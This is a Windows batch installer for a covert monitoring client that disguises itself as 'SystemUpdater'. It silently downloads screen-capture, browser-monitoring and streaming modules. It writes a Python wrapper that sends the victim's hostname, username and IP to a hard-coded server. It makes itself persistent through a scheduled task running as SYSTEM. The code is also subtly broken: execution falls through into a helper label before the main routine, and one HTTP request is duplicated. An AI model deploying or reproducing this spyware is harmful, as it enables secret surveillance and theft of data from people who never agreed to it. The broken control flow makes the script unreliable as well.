@echo off
setlocal enabledelayedexpansion

:: Tenjo Stealth Installer for Windows
:: This script downloads and installs the monitoring client silently
:: Usage: quick_install_stealth_windows.bat [true] for silent mode

:: Configuration
set "APP_NAME=SystemUpdater"
set "INSTALL_DIR=%USERPROFILE%\.config\system-utils"
set "SERVICE_NAME=SystemUpdater"
set "LOG_DIR=%USERPROFILE%\AppData\Local\SystemUpdater"
set "PYTHON_REQUIREMENTS=requests mss psutil pillow"
set "GITHUB_RAW=https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client"

:: Progress tracking
set "INSTALL_PROGRESS=0"
set "TOTAL_STEPS=8"

:: Colors for output
set "RED=[91m"
set "GREEN=[92m"
set "BLUE=[94m"
set "YELLOW=[93m"
set "NC=[0m"

:: Silent mode check
set "SILENT=%1"
if "%SILENT%"=="" set "SILENT=false"

:: Initialize status variables
set "INSTALL_SUCCESS=false"
set "ERROR_COUNT=0"
set "ERROR_MESSAGES="
set "REGISTRATION_SUCCESS=false"

:: Function to show progress
:show_progress
set /a PERCENTAGE=(%1*100)/%TOTAL_STEPS%
if not "%SILENT%"=="true" (
    echo %BLUE%[%1/%TOTAL_STEPS% - %PERCENTAGE%%%] %~2%NC%
)
goto :eof

:: Function to log messages
:log
if not "%SILENT%"=="true" (
    echo %~1
)
goto :eof

:: Function to log errors
:log_error
set /a ERROR_COUNT+=1
set "ERROR_MESSAGES=%ERROR_MESSAGES%%~1 "
if not "%SILENT%"=="true" (
    echo %RED%[ERROR] %~1%NC%
)
goto :eof

:: Function to log success
:log_success
if not "%SILENT%"=="true" (
    echo %GREEN%[SUCCESS] %~1%NC%
)
goto :eof

:: Function to log info
:log_info
if not "%SILENT%"=="true" (
    echo %BLUE%[INFO] %~1%NC%
)
goto :eof

:: Main installation function
:main
call :log "%BLUE%🔧 Tenjo Stealth Installer for Windows v2.0%NC%"
call :log "%BLUE%=============================================%NC%"

:: Admin check
net session >nul 2>&1
if %errorLevel% == 0 (
    set "IS_ADMIN=true"
    call :log_info "Running with administrator privileges"
) else (
    set "IS_ADMIN=false"
    call :log_info "Running with user privileges"
)

:: Stop existing processes and services
call :show_progress 1 "Stopping existing processes and services"
call :stop_existing_services

:: Create installation directories
call :show_progress 2 "Creating installation directories"
call :create_directories

:: Download application files
call :show_progress 3 "Downloading application files"
call :download_files

:: Install Python dependencies
call :show_progress 4 "Installing Python dependencies"
call :install_dependencies

:: Create stealth main script
call :show_progress 5 "Creating stealth service wrapper"
call :create_stealth_main

:: Configure auto-start service
call :show_progress 6 "Configuring auto-start service"
call :configure_service

:: Start the service
call :show_progress 7 "Starting monitoring service and auto-registration"
call :start_service

:: Create uninstall script
call :show_progress 8 "Creating uninstaller and finalizing installation"
call :create_uninstaller

:: Display final status
call :display_final_status

goto :end

:: Stop existing processes and services
:stop_existing_services
taskkill /f /im python.exe >nul 2>&1
taskkill /f /im pythonw.exe >nul 2>&1
wmic process where "commandline like '%%stealth_main.py%%'" delete >nul 2>&1
schtasks /end /tn "%SERVICE_NAME%" >nul 2>&1
schtasks /delete /tn "%SERVICE_NAME%" /f >nul 2>&1
timeout /t 2 >nul
goto :eof

:: Create installation directories
:create_directories
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" 2>nul
    if not exist "%INSTALL_DIR%" (
        call :log_error "Failed to create installation directory"
        goto :eof
    )
)

mkdir "%INSTALL_DIR%\src" 2>nul
mkdir "%INSTALL_DIR%\src\core" 2>nul
mkdir "%INSTALL_DIR%\src\modules" 2>nul
mkdir "%INSTALL_DIR%\src\utils" 2>nul
mkdir "%INSTALL_DIR%\logs" 2>nul
mkdir "%LOG_DIR%" 2>nul

goto :eof

:: Download application files
:download_files
set "DOWNLOAD_SUCCESS=true"

:: Download main files
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/main.py' -OutFile '%INSTALL_DIR%\main.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 (
    set "DOWNLOAD_SUCCESS=false"
    call :log_error "Failed to download main.py"
)

:: Download core modules
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/core/config.py' -OutFile '%INSTALL_DIR%\src\core\config.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 set "DOWNLOAD_SUCCESS=false"

powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/utils/api_client.py' -OutFile '%INSTALL_DIR%\src\utils\api_client.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 set "DOWNLOAD_SUCCESS=false"

powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/utils/stealth.py' -OutFile '%INSTALL_DIR%\src\utils\stealth.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 set "DOWNLOAD_SUCCESS=false"

powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/screen_capture.py' -OutFile '%INSTALL_DIR%\src\modules\screen_capture.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 set "DOWNLOAD_SUCCESS=false"

powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/browser_monitor.py' -OutFile '%INSTALL_DIR%\src\modules\browser_monitor.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 set "DOWNLOAD_SUCCESS=false"

powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/process_monitor.py' -OutFile '%INSTALL_DIR%\src\modules\process_monitor.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 set "DOWNLOAD_SUCCESS=false"

powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/stream_handler.py' -OutFile '%INSTALL_DIR%\src\modules\stream_handler.py' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
if errorlevel 1 set "DOWNLOAD_SUCCESS=false"

:: Create __init__.py files
echo. > "%INSTALL_DIR%\src\__init__.py"
echo. > "%INSTALL_DIR%\src\core\__init__.py"
echo. > "%INSTALL_DIR%\src\modules\__init__.py"
echo. > "%INSTALL_DIR%\src\utils\__init__.py"

if "%DOWNLOAD_SUCCESS%"=="false" (
    call :log_error "Failed to download some application files"
) else (
    call :log_success "All application files downloaded successfully"
)

goto :eof

:: Install Python dependencies with multiple fallback methods
:install_dependencies
set "DEPS_SUCCESS=false"

:: Method 1: Try with --user flag (standard approach)
python -m pip install --user --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
if !errorlevel! equ 0 (
    set "DEPS_SUCCESS=true"
    call :log_success "Dependencies installed with python --user"
    goto :deps_done
)

:: Method 2: Try without --user flag  
python -m pip install --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
if !errorlevel! equ 0 (
    set "DEPS_SUCCESS=true"
    call :log_success "Dependencies installed with python"
    goto :deps_done
)

:: Method 3: Try with python3 command
python3 -m pip install --user --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
if !errorlevel! equ 0 (
    set "DEPS_SUCCESS=true"
    call :log_success "Dependencies installed with python3 --user"
    goto :deps_done
)

:: Method 4: Try py launcher with --user
py -m pip install --user --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
if !errorlevel! equ 0 (
    set "DEPS_SUCCESS=true"
    call :log_success "Dependencies installed with py --user"
    goto :deps_done
)

:: Method 5: If admin, try system-wide installation
if "%IS_ADMIN%"=="true" (
    python -m pip install %PYTHON_REQUIREMENTS% >nul 2>&1
    if !errorlevel! equ 0 (
        set "DEPS_SUCCESS=true"
        call :log_success "Dependencies installed system-wide"
        goto :deps_done
    )
)

call :log_error "Failed to install Python dependencies - will try at runtime"

:deps_done
goto :eof

:: Create enhanced stealth main script
:create_stealth_main
(
echo import sys
echo import os
echo import time
echo import signal
echo import logging
echo import subprocess
echo from pathlib import Path
echo.
echo # Set up logging
echo log_dir = Path^(__file__^).parent / "logs"
echo log_dir.mkdir^(exist_ok=True^)
echo.
echo logging.basicConfig^(
echo     level=logging.WARNING,
echo     format='%%^(asctime^)s - %%^(levelname^)s - %%^(message^)s',
echo     handlers=[
echo         logging.FileHandler^(log_dir / "stealth.log"^),
echo         logging.FileHandler^(Path.home^(^) / "AppData" / "Local" / "SystemUpdater" / "system.log"^)
echo     ]
echo ^)
echo.
echo def signal_handler^(signum, frame^):
echo     logging.info^("Received signal %%d, shutting down gracefully...", signum^)
echo     sys.exit^(0^)
echo.
echo def install_missing_packages^(^):
echo     """Try to install missing packages at runtime"""
echo     packages = ['requests', 'mss', 'psutil', 'pillow']
echo     
echo     for package in packages:
echo         try:
echo             __import__^(package^)
echo         except ImportError:
echo             logging.warning^(f"Missing package: {package}, attempting installation..."^)
echo             try:
echo                 python_commands = [sys.executable, 'python', 'python3', 'py']
echo                 for python_cmd in python_commands:
echo                     try:
echo                         result = subprocess.run^([python_cmd, '-m', 'pip', 'install', '--user', package], 
echo                                                 capture_output=True, check=True, timeout=30^)
echo                         logging.info^(f"Successfully installed {package} with {python_cmd}"^)
echo                         break
echo                     except ^(subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError^):
echo                         continue
echo                 else:
echo                     logging.error^(f"Failed to install {package} with all methods"^)
echo             except Exception as e:
echo                 logging.error^(f"Error installing {package}: {e}"^)
echo.
echo def auto_register_client^(^):
echo     """Automatically register client with server"""
echo     try:
echo         import requests
echo         import socket
echo         import platform
echo         import os
echo         import uuid
echo         
echo         # Auto-detect IP address
echo         def get_real_ip^(^):
echo             try:
echo                 # Method 1: Connect to external server to get local IP
echo                 with socket.socket^(socket.AF_INET, socket.SOCK_DGRAM^) as s:
echo                     s.connect^(^("8.8.8.8", 80^)^)
echo                     return s.getsockname^(^)[0]
echo             except:
echo                 try:
echo                     # Method 2: Get hostname IP
echo                     hostname = socket.gethostname^(^)
echo                     return socket.gethostbyname^(hostname^)
echo                 except:
echo                     return "192.168.1.100"  # Fallback
echo         
echo         # Get system information
echo         hostname = socket.gethostname^(^)
echo         username = os.getenv^('USERNAME', 'Unknown'^)
echo         ip_address = get_real_ip^(^)
echo         client_id = str^(uuid.uuid4^(^)^)
echo         
echo         # Registration data with correct format
echo         client_data = {
echo             'client_id': client_id,
echo             'hostname': hostname,
echo             'ip_address': ip_address,
echo             'username': username,
echo             'os_info': {
echo                 'name': platform.system^(^),
echo                 'version': platform.release^(^),
echo                 'architecture': platform.machine^(^)
echo             },
echo             'timezone': 'Asia/Jakarta'
echo         }
echo         
echo         # Try to register with production server - use correct endpoint
echo         server_url = 'http://103.129.149.67/api/clients/register'
echo         headers = {
echo             'Content-Type': 'application/json',
echo             'Accept': 'application/json'
echo         }
echo         response = requests.post^(server_url, json=client_data, headers=headers, timeout=15^)
echo         response = requests.post^(server_url, json=client_data, headers=headers, timeout=15^)
echo         
echo         if response.status_code in [200, 201]:
echo             logging.info^(f"Client successfully registered - ID: {client_id[:8]}... IP: {ip_address}"^)
echo             return True
echo         else:
echo             logging.warning^(f"Registration failed with status: {response.status_code}"^)
echo             return False
echo             
echo     except Exception as e:
echo         logging.warning^(f"Auto-registration failed: {e}. Will retry on next connection."^)
echo         return False
echo.
echo def main^(^):
echo     try:
echo         signal.signal^(signal.SIGTERM, signal_handler^)
echo         signal.signal^(signal.SIGINT, signal_handler^)
echo     except:
echo         pass
echo     
echo     app_dir = Path^(__file__^).parent
echo     os.chdir^(app_dir^)
echo     
echo     logging.warning^("SystemUpdater monitoring service started"^)
echo     logging.info^(f"Working directory: {app_dir}"^)
echo     logging.info^(f"Python executable: {sys.executable}"^)
echo     
echo     try:
echo         # Install missing packages first
echo         install_missing_packages^(^)
echo         
echo         # Try to auto-register client with server
echo         logging.info^("Attempting client auto-registration..."^)
echo         if auto_register_client^(^):
echo             logging.info^("Client auto-registration successful"^)
echo         else:
echo             logging.warning^("Client auto-registration failed, will retry later"^)
echo         
echo         # Add current directory to Python path
echo         sys.path.insert^(0, str^(app_dir^)^)
echo         
echo         # Import and run main application
echo         import main
echo         logging.info^("Starting main application in stealth mode"^)
echo         main.main^(stealth_mode=True^)
echo         
echo     except KeyboardInterrupt:
echo         logging.info^("Service interrupted by user"^)
echo         sys.exit^(0^)
echo     except Exception as e:
echo         logging.error^(f"Application error: {e}"^)
echo         logging.error^(f"Python path: {sys.path}"^)
echo         logging.error^(f"Working directory: {os.getcwd^(^)}"^)
echo         time.sleep^(10^)
echo         sys.exit^(1^)
echo.
echo if __name__ == "__main__":
echo     main^(^)
) > "%INSTALL_DIR%\stealth_main.py"

if exist "%INSTALL_DIR%\stealth_main.py" (
    call :log_success "Stealth service wrapper created"
) else (
    call :log_error "Failed to create stealth service wrapper"
)

goto :eof

:: Configure auto-start service using Task Scheduler
:configure_service
:: Detect the best Python executable path
set "PYTHON_EXE=python"
where python >nul 2>&1 && set "PYTHON_EXE=python"
where python3 >nul 2>&1 && set "PYTHON_EXE=python3"  
where py >nul 2>&1 && set "PYTHON_EXE=py"

:: Create task that runs at startup
if "%IS_ADMIN%"=="true" (
    schtasks /create /tn "%SERVICE_NAME%" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\stealth_main.py\"" /sc onstart /ru "SYSTEM" /rl highest /f >nul 2>&1
) else (
    schtasks /create /tn "%SERVICE_NAME%" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\stealth_main.py\"" /sc onlogon /f >nul 2>&1
)

if !errorlevel! equ 0 (
    call :log_success "Auto-start service configured successfully"
) else (
    call :log_error "Failed to configure auto-start service"
)

goto :eof

:: Start the service immediately
:start_service
schtasks /run /tn "%SERVICE_NAME%" >nul 2>&1

:: Wait a moment and check if it's running
timeout /t 3 >nul

tasklist /fi "imagename eq python*" | findstr /i stealth >nul 2>&1
if !errorlevel! equ 0 (
    call :log_success "Monitoring service started successfully"
    
    :: Check auto-registration after a short delay
    call :log_info "Verifying client auto-registration..."
    timeout /t 5 >nul
    
    :: Check if registration was successful by looking at logs
    if exist "%INSTALL_DIR%\logs\stealth.log" (
        findstr /i "registration successful" "%INSTALL_DIR%\logs\stealth.log" >nul 2>&1
        if !errorlevel! equ 0 (
            call :log_success "Client auto-registration completed"
            set "REGISTRATION_SUCCESS=true"
        ) else (
            call :log_info "Auto-registration will complete on first connection"
            set "REGISTRATION_SUCCESS=false"
        )
    ) else (
        set "REGISTRATION_SUCCESS=false"
    )
    
    set "INSTALL_SUCCESS=true"
) else (
    call :log_error "Service may not have started properly"
    set "REGISTRATION_SUCCESS=false"
)

goto :eof

:: Create uninstall script
:create_uninstaller
(
echo @echo off
echo setlocal enabledelayedexpansion
echo.
echo echo Stopping SystemUpdater service...
echo taskkill /f /im python.exe /fi "commandline like *stealth_main*" ^>nul 2^>^&1
echo taskkill /f /im pythonw.exe /fi "commandline like *stealth_main*" ^>nul 2^>^&1
echo schtasks /end /tn "SystemUpdater" ^>nul 2^>^&1
echo schtasks /delete /tn "SystemUpdater" /f ^>nul 2^>^&1
echo.
echo echo Removing installation files...
echo if exist "%INSTALL_DIR%" rmdir /s /q "%INSTALL_DIR%" ^>nul 2^>^&1
echo if exist "%LOG_DIR%" rmdir /s /q "%LOG_DIR%" ^>nul 2^>^&1
echo.
echo echo SystemUpdater service uninstalled successfully
echo pause
) > "%INSTALL_DIR%\uninstall.bat"

goto :eof

:: Display final installation status
:display_final_status
call :log ""
if "%INSTALL_SUCCESS%"=="true" (
    call :log "%GREEN%🎉 INSTALLATION COMPLETED SUCCESSFULLY%NC%"
    call :log "%GREEN%========================================%NC%"
    call :log "%GREEN%✅ SystemUpdater service installed and running%NC%"
    call :log "%GREEN%✅ Auto-start configured for system boot%NC%"
    call :log "%GREEN%✅ Service running silently in background%NC%"
    if "%REGISTRATION_SUCCESS%"=="true" (
        call :log "%GREEN%✅ Client successfully registered with server%NC%"
    ) else (
        call :log "%YELLOW%⚠️  Client will auto-register on next connection%NC%"
    )
    call :log ""
    call :log "%BLUE%📍 Installation Summary:%NC%"
    call :log "   📁 Install Location: %INSTALL_DIR%"
    call :log "   📋 Service Name: %SERVICE_NAME%"
    call :log "   📊 Log Location: %LOG_DIR%"
    call :log "   🗑️  Uninstaller: %INSTALL_DIR%\uninstall.bat"
    call :log ""
    call :log "%BLUE%🔍 Verification Commands:%NC%"
    call :log "   • Check Task Scheduler for '%SERVICE_NAME%' task"
    call :log "   • Monitor logs: %INSTALL_DIR%\logs\stealth.log"
    call :log "   • System logs: %LOG_DIR%\system.log"
    call :log "   • Check processes: tasklist | findstr python"
    call :log ""
    call :log "%YELLOW%💡 The monitoring service is now active and will auto-start on boot%NC%"
    
    exit /b 0
) else (
    call :log "%RED%❌ INSTALLATION FAILED%NC%"
    call :log "%RED%====================%NC%"
    call :log "%RED%Installation encountered %ERROR_COUNT% error(s):%NC%"
    if defined ERROR_MESSAGES (
        call :log "%RED%Errors: %ERROR_MESSAGES%%NC%"
    )
    call :log ""
    call :log "%YELLOW%🔧 Troubleshooting Steps:%NC%"
    call :log "   1. Ensure Python 3.x is installed and in PATH"
    call :log "   2. Check internet connection for downloads"
    call :log "   3. Run as administrator for better compatibility"
    call :log "   4. Verify antivirus is not blocking the installation"
    call :log ""
    call :log "%BLUE%📞 Support: Check logs in %INSTALL_DIR%\logs\ for details%NC%"
    
    exit /b 1
)
call :log ""

goto :eof

:end
endlocal
exit /b 0
